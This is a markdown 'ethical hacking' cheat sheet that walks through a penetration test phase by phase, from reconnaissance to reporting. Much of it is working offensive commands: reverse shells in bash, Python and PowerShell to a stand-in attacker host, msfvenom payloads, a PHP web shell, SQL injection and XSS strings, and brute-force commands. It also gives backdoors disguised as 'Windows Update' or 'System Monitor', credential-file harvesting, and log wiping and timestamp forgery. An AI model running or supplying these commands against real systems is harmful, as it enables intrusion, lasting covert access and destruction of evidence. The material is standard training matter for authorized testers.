# 🔐 Complete Ethical Hacking Methodology & Cheat Sheet

*A comprehensive step-by-step guide for authorized penetration testing with tools, commands, and techniques*

---

## 📋 Table of Contents

1. [Pre-Engagement & Setup](#pre-engagement--setup)
2. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
3. [Phase 2: Scanning & Enumeration](#phase-2-scanning--enumeration)
4. [Phase 3: Vulnerability Assessment](#phase-3-vulnerability-assessment)
5. [Phase 4: Exploitation](#phase-4-exploitation)
6. [Phase 5: Post-Exploitation](#phase-5-post-exploitation)
7. [Phase 6: Maintaining Access](#phase-6-maintaining-access)
8. [Phase 7: Covering Tracks](#phase-7-covering-tracks)
9. [Phase 8: Reporting](#phase-8-reporting)
10. [Essential Tools Reference](#essential-tools-reference)

---

## ⚖️ Legal Disclaimer

**🚨 CRITICAL**: This methodology is for **AUTHORIZED PENETRATION TESTING ONLY**
- Only use on systems you own or have explicit written permission to test
- Follow all applicable laws and regulations
- Document all activities for client remediation
- Use responsibly and ethically

---

## Pre-Engagement & Setup

### Environment Preparation

| **Task** | **Command/Action** | **Purpose** |
|----------|-------------------|-------------|
| **Connect to VPN** | `sudo openvpn client.ovpn` | Secure testing environment |
| **Check IP** | `ifconfig` or `ip a` | Verify network configuration |
| **Check routes** | `netstat -rn` or `ip route` | Understand network topology |
| **Start tmux** | `tmux` | Session management |
| **Create workspace** | `mkdir pentest_target && cd pentest_target` | Organize findings |

### Essential Directory Structure
```bash
mkdir -p {reconnaissance,scanning,exploitation,post-exploitation,evidence,reporting}
mkdir -p tools/{scripts,wordlists,exploits}
```

---

## Phase 1: Reconnaissance

*Goal: Gather information about the target without direct interaction*

### 1.1 Passive Information Gathering

#### OSINT (Open Source Intelligence)
| **Technique** | **Command/Tool** | **Purpose** |
|---------------|------------------|-------------|
| **Domain WHOIS** | `whois target.com` | Domain registration info |
| **DNS Records** | `dig target.com ANY` | DNS infrastructure |
| **Google Dorking** | `site:target.com filetype:pdf` | Exposed documents |
| **Shodan** | Browse to shodan.io | Internet-connected devices |
| **Certificate Transparency** | Browse to crt.sh | SSL certificate history |

#### Email Harvesting
```bash
# theHarvester - Email enumeration
theharvester -d target.com -l 500 -b google
theharvester -d target.com -l 500 -b linkedin

# Manual Google search
site:target.com "@target.com"
```

#### Social Media Intelligence
| **Platform** | **Search Technique** | **Information Gained** |
|--------------|---------------------|----------------------|
| **LinkedIn** | Company employees | Staff names, roles, technologies |
| **Twitter** | @company mentions | Company updates, technologies |
| **GitHub** | user:company | Source code, configurations |

### 1.2 Active Information Gathering

#### DNS Enumeration
```bash
# Basic DNS queries
nslookup target.com
dig target.com
dig @8.8.8.8 target.com

# DNS zone transfer attempt
dig axfr @ns1.target.com target.com

# Reverse DNS lookup
dig -x 192.168.1.1
```

#### Subdomain Enumeration
```bash
# Subfinder - Fast subdomain discovery
subfinder -d target.com -all -silent

# Amass - Comprehensive enumeration
amass enum -d target.com

# Gobuster DNS mode
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Manual subdomain validation
for sub in $(cat subdomains.txt); do dig +short $sub | grep -v '^$' && echo "$sub is alive"; done
```

#### Web Reconnaissance
```bash
# Basic web enumeration
curl -IL https://target.com
whatweb target.com
wget -r --spider target.com 2>&1 | grep -E "robots.txt|sitemap.xml"

# Technology fingerprinting
wafw00f target.com
builtwith.com (web interface)
```

---

## Phase 2: Scanning & Enumeration

*Goal: Discover live hosts, open ports, and running services*

### 2.1 Network Discovery

#### Host Discovery
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP scan (local network)
arp-scan -l
netdiscover -r 192.168.1.0/24

# Masscan for large networks
masscan -p80,443,22,21,25,53,110,143,993,995 --rate=1000 192.168.1.0/24
```

### 2.2 Port Scanning

#### Nmap Scanning Methodology
```bash
# 1. Quick scan (top 1000 ports)
nmap -T4 -F target.com

# 2. Comprehensive TCP scan
nmap -sS -T4 -A -p- target.com

# 3. UDP scan (top 1000)
nmap -sU -T4 --top-ports 1000 target.com

# 4. Service version detection
nmap -sV -sC -p 22,80,443,445 target.com

# 5. Aggressive scan with scripts
nmap -A -T4 -p- target.com

# 6. Stealth scan
nmap -sS -T2 -f target.com
```

#### Specialized Port Scans
| **Scan Type** | **Command** | **Use Case** |
|---------------|-------------|--------------|
| **SYN Stealth** | `nmap -sS target.com` | Avoid detection |
| **Connect Scan** | `nmap -sT target.com` | When SYN is blocked |
| **FIN Scan** | `nmap -sF target.com` | Firewall evasion |
| **Xmas Scan** | `nmap -sX target.com` | IDS evasion |
| **Null Scan** | `nmap -sN target.com` | Stealth scanning |

### 2.3 Service Enumeration

#### Web Services (HTTP/HTTPS)
```bash
# Directory and file discovery
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt
dirb http://target.com /usr/share/wordlists/dirb/common.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://target.com/FUZZ

# Technology-specific scans
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/CGI-XPlatform.txt -x php,asp,aspx,jsp

# Nikto web vulnerability scanner
nikto -h http://target.com

# WebDAV testing
davtest -url http://target.com
cadaver http://target.com
```

#### SSH (Port 22)
```bash
# Banner grabbing
nc target.com 22
ssh-keyscan target.com

# Enumerate supported algorithms
nmap --script ssh2-enum-algos target.com

# SSH audit
ssh-audit target.com
```

#### FTP (Port 21)
```bash
# Banner grabbing
nc target.com 21

# Anonymous login test
ftp target.com
# Try: anonymous / anonymous

# Nmap FTP scripts
nmap --script ftp-* target.com -p 21
```

#### SMB/NetBIOS (Ports 139/445)
```bash
# SMB enumeration
smbclient -L //target.com -N
smbclient //target.com/share -N

# Enum4linux
enum4linux target.com

# Nmap SMB scripts
nmap --script smb-enum-* target.com -p 445
nmap --script smb-vuln-* target.com -p 445

# SMBMap
smbmap -H target.com
smbmap -H target.com -u anonymous
```

#### SNMP (Port 161)
```bash
# SNMP walk
snmpwalk -v 2c -c public target.com

# Community string bruteforce
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt target.com

# SNMP enumeration
snmp-check target.com
```

#### Email Services (Ports 25, 110, 143, 993, 995)
```bash
# SMTP enumeration
nmap --script smtp-enum-users target.com -p 25
smtp-user-enum -M VRFY -U users.txt -t target.com

# POP3/IMAP banner grabbing
nc target.com 110  # POP3
nc target.com 143  # IMAP
```

---

## Phase 3: Vulnerability Assessment

*Goal: Identify security weaknesses and potential attack vectors*

### 3.1 Automated Vulnerability Scanning

#### Nessus
```bash
# Nessus CLI (if available)
nessuscli scan new --targets target.com --name "Target Scan"

# Web interface: https://localhost:8834
# Create new scan -> Basic Network Scan
```

#### OpenVAS
```bash
# Start OpenVAS
gvm-start
# Web interface: https://localhost:9392
```

#### Nuclei
```bash
# Install and update
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
nuclei -update-templates

# Basic vulnerability scan
nuclei -u target.com

# Scan with specific severity
nuclei -u target.com -severity critical,high

# Scan with specific tags
nuclei -u target.com -tags cve,oast,sqli
```

### 3.2 Manual Vulnerability Testing

#### Web Application Testing
```bash
# SQL Injection testing
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" --tables -D database_name

# XSS testing
# Manual payloads:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# CSRF testing
# Check for anti-CSRF tokens in forms

# File upload testing
# Try uploading: .php, .asp, .jsp files
# Bypass: .php.jpg, .pHP, .php5
```

#### SSL/TLS Testing
```bash
# SSL Labs scan (web interface)
# https://www.ssllabs.com/ssltest/

# testssl.sh
./testssl.sh target.com

# SSLyze
sslyze target.com:443

# Check certificate details
openssl s_client -connect target.com:443 -servername target.com
```

---

## Phase 4: Exploitation

*Goal: Gain initial access to target systems*

### 4.1 Public Exploit Research

#### Searchsploit
```bash
# Search for exploits
searchsploit apache 2.4.41
searchsploit windows smb

# Copy exploit to current directory
searchsploit -m 47887

# Show exploit details
searchsploit -x 47887
```

#### Metasploit Framework
```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:linux ssh
search cve:2021 rank:excellent

# Use exploit
use exploit/linux/ssh/sshexec
show options
set RHOSTS target.com
set USERNAME root
set PASSWORD password
exploit

# Generate payloads
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell.exe
```

### 4.2 Password Attacks

#### Hydra - Network Service Brute Force
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com

# HTTP POST form brute force
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://target.com

# SMB brute force
hydra -L users.txt -P passwords.txt smb://target.com
```

#### Hash Cracking
```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

# Hashcat
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA-512
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM

# Hash identification
hashid hash_value
hash-identifier
```

### 4.3 Web Application Exploitation

#### SQL Injection
```bash
# Manual testing
' OR '1'='1
admin'--
' UNION SELECT 1,2,3--

# SQLMap automated
sqlmap -u "http://target.com/page?id=1" --dump
sqlmap -u "http://target.com/page?id=1" --os-shell
```

#### File Upload Vulnerabilities
```bash
# PHP web shell
echo "<?php system(\$_GET['cmd']); ?>" > shell.php

# Upload bypasses
shell.php.jpg
shell.pHP
shell.php%00.jpg
```

### 4.4 Network Service Exploitation

#### SSH
```bash
# SSH key authentication
ssh-keygen -t rsa -b 4096
ssh-copy-id user@target.com
ssh user@target.com -i ~/.ssh/id_rsa
```

#### SMB
```bash
# Eternal Blue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
exploit

# PSExec
use exploit/windows/smb/psexec
set RHOSTS target.com
set SMBUser administrator
set SMBPass password
exploit
```

---

## Phase 5: Post-Exploitation

*Goal: Establish foothold and gather information*

### 5.1 Initial Access Verification

#### System Information
```bash
# Linux
whoami
id
uname -a
cat /etc/os-release
ps aux

# Windows
whoami
whoami /priv
systeminfo
tasklist
net user
```

### 5.2 Privilege Escalation

#### Linux Privilege Escalation
```bash
# Automated enumeration
wget http://attacker_ip:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Manual checks
sudo -l
cat /etc/passwd
cat /etc/shadow
find / -perm -u=s -type f 2>/dev/null  # SUID binaries
crontab -l
cat /etc/crontab

# Kernel exploits
uname -a
searchsploit linux kernel 4.15
```

#### Windows Privilege Escalation
```powershell
# Automated enumeration
.\winPEAS.exe
.\PowerUp.ps1; Invoke-AllChecks

# Manual checks
whoami /priv
net user
net localgroup administrators
wmic qfe  # Installed patches
sc query  # Running services

# Registry
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

### 5.3 Lateral Movement

#### Network Discovery
```bash
# Discover internal network
arp -a
route -n
netstat -an

# Internal port scan
for i in {1..254}; do ping -c 1 192.168.1.$i & done
nmap -sn 192.168.1.0/24
```

#### Credential Harvesting
```bash
# Linux
cat ~/.bash_history
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
grep -r "password" /etc/ 2>/dev/null

# Windows
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
findstr /si password *.txt *.xml *.config
```

---

## Phase 6: Maintaining Access

*Goal: Establish persistent access for ongoing testing*

### 6.1 Shell Establishment

#### Reverse Shells
```bash
# Set up listener
nc -lvnp 4444

# Bash reverse shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker_ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Shell Upgrades
```bash
# Upgrade to fully interactive TTY
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo
fg
# Press Enter twice
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows 38 columns 116
```

### 6.2 Persistence Mechanisms

#### Linux Persistence
```bash
# SSH keys
mkdir ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Cron jobs
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'") | crontab -

# Service creation
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Monitor

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
```

#### Windows Persistence
```powershell
# Registry Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Update" /t REG_SZ /d "C:\Windows\System32\backdoor.exe"

# Scheduled task
schtasks /create /tn "Windows Update Check" /tr "powershell.exe -WindowStyle Hidden -File C:\backdoor.ps1" /sc onlogon /ru SYSTEM

# Service creation
sc create "WindowsUpdate" binPath= "C:\Windows\System32\backdoor.exe" start= auto
sc start "WindowsUpdate"
```

---

## Phase 7: Covering Tracks

*Goal: Remove evidence of testing activities*

### 7.1 Log Manipulation

#### Linux Log Clearing
```bash
# Clear auth logs
> /var/log/auth.log
> /var/log/secure

# Clear system logs
> /var/log/syslog
> /var/log/messages

# Clear command history
history -c
> ~/.bash_history
unset HISTFILE

# Clear Apache logs
> /var/log/apache2/access.log
> /var/log/apache2/error.log
```

#### Windows Log Clearing
```powershell
# Clear event logs
wevtutil cl Application
wevtutil cl Security
wevtutil cl System

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Clear specific event IDs
wevtutil cl "Windows PowerShell"
```

### 7.2 File Cleanup

#### Secure File Deletion
```bash
# Linux - secure delete
shred -vfz -n 3 sensitive_file.txt
rm sensitive_file.txt

# Windows - sdelete
sdelete -p 3 -s -z C:\temp\
```

#### Timestamp Manipulation
```bash
# Linux
touch -r reference_file target_file
touch -d "2023-01-01 12:00:00" target_file

# Windows
powershell "(Get-Item 'file.txt').LastWriteTime = '01/01/2023 12:00:00'"
```

---

## Phase 8: Reporting

*Goal: Document findings and provide remediation guidance*

### 8.1 Evidence Collection

#### Screenshot Standards
- High resolution (1920x1080 minimum)
- Clear annotations
- Timestamp visible
- Context included

#### Command Documentation
```bash
# Always document commands with output
echo "Command: $(date)" >> evidence.log
whoami >> evidence.log
id >> evidence.log
```

### 8.2 Finding Classification

#### Risk Matrix
| **Probability** | **Impact** | **Risk Level** |
|----------------|------------|----------------|
| High + Critical | Critical | Critical |
| High + High | High | High |
| Medium + High | High | Medium-High |
| Low + Any | Low-Medium | Low |

---

## Essential Tools Reference

### 📁 Basic System Tools

#### tmux (Terminal Multiplexer)
| **Command** | **Description** |
|-------------|-----------------|
| `tmux` | Start new session |
| `Ctrl+b c` | New window |
| `Ctrl+b %` | Split vertically |
| `Ctrl+b "` | Split horizontally |
| `Ctrl+b →` | Switch to right pane |
| `Ctrl+b d` | Detach session |
| `tmux attach` | Reattach to session |

#### vim (Text Editor)
| **Command** | **Description** |
|-------------|-----------------|
| `vim file` | Open file |
| `i` | Insert mode |
| `Esc` | Normal mode |
| `dd` | Delete line |
| `yy` | Copy line |
| `p` | Paste |
| `:w` | Save |
| `:q` | Quit |
| `:wq` | Save and quit |
| `:q!` | Quit without saving |

### 🌐 Network Utilities

#### netcat (The Swiss Army Knife)
| **Command** | **Description** |
|-------------|-----------------|
| `nc -lvnp 4444` | Listen on port 4444 |
| `nc target.com 80` | Connect to port 80 |
| `nc -e /bin/bash target.com 4444` | Bind shell |
| `nc -zv target.com 1-1000` | Port scan |

### 📊 File Transfer Methods

| **Method** | **Command** | **Use Case** |
|------------|-------------|--------------|
| **HTTP Server** | `python3 -m http.server 8000` | Serve files locally |
| **wget** | `wget http://attacker_ip:8000/file` | Download from HTTP |
| **curl** | `curl http://attacker_ip:8000/file -o file` | Download with curl |
| **SCP** | `scp file user@target:/tmp/` | Secure copy over SSH |
| **Base64** | `base64 file \| base64 -d > file` | Encode/decode transfer |
| **FTP** | `python -m pyftpdlib -p 21` | Simple FTP server |

### 🔐 Hash & Encoding

#### Hash Identification
| **Hash Type** | **Example Length** | **Hashcat Mode** |
|---------------|-------------------|------------------|
| **MD5** | 32 chars | -m 0 |
| **SHA1** | 40 chars | -m 100 |
| **SHA256** | 64 chars | -m 1400 |
| **NTLM** | 32 chars | -m 1000 |
| **bcrypt** | 60 chars | -m 3200 |

#### Common Encodings
```bash
# Base64
echo "text" | base64
echo "dGV4dAo=" | base64 -d

# URL encoding
python -c "import urllib.parse; print(urllib.parse.quote('text with spaces'))"

# Hex encoding
echo "text" | xxd -p
echo "74657874" | xxd -r -p
```

---

## 🎯 Engagement Workflow Checklist

### Pre-Engagement
- [ ] Signed statement of work
- [ ] Defined scope and rules of engagement
- [ ] Emergency contact procedures
- [ ] Testing environment prepared
- [ ] Tools and wordlists updated

### Reconnaissance Phase
- [ ] Passive information gathering completed
- [ ] OSINT sources documented
- [ ] DNS enumeration performed
- [ ] Subdomain discovery executed
- [ ] Social media intelligence gathered

### Scanning Phase
- [ ] Network discovery completed
- [ ] Port scanning finished
- [ ] Service enumeration performed
- [ ] Web application discovery executed
- [ ] Banner grabbing completed

### Vulnerability Assessment
- [ ] Automated scans completed
- [ ] Manual testing performed
- [ ] Vulnerabilities classified
- [ ] Risk assessment completed
- [ ] Exploitability verified

### Exploitation Phase
- [ ] Public exploits researched
- [ ] Custom exploits developed
- [ ] Password attacks executed
- [ ] Initial access achieved
- [ ] Proof of concept documented

### Post-Exploitation
- [ ] System information gathered
- [ ] Privilege escalation attempted
- [ ] Lateral movement performed
- [ ] Sensitive data identified
- [ ] Network topology mapped

### Reporting Phase
- [ ] All findings documented
- [ ] Evidence screenshots captured
- [ ] Risk ratings assigned
- [ ] Remediation steps provided
- [ ] Executive summary written

---

## 🚨 Emergency Procedures

### If Something Goes Wrong
1. **Stop immediately** if system becomes unstable
2. **Document the issue** with timestamps
3. **Contact client** emergency contact
4. **Preserve evidence** of what happened
5. **Assist with recovery** if needed

### Professional Standards
- Always maintain professionalism
- Document everything thoroughly
- Respect client systems and data
- Follow responsible disclosure practices
- Provide constructive remediation guidance

---

**🔐 Remember: With great power comes great responsibility. Use these techniques only for authorized testing to improve security posture.**

*Last updated: October 2025 | Comprehensive Ethical Hacking Methodology*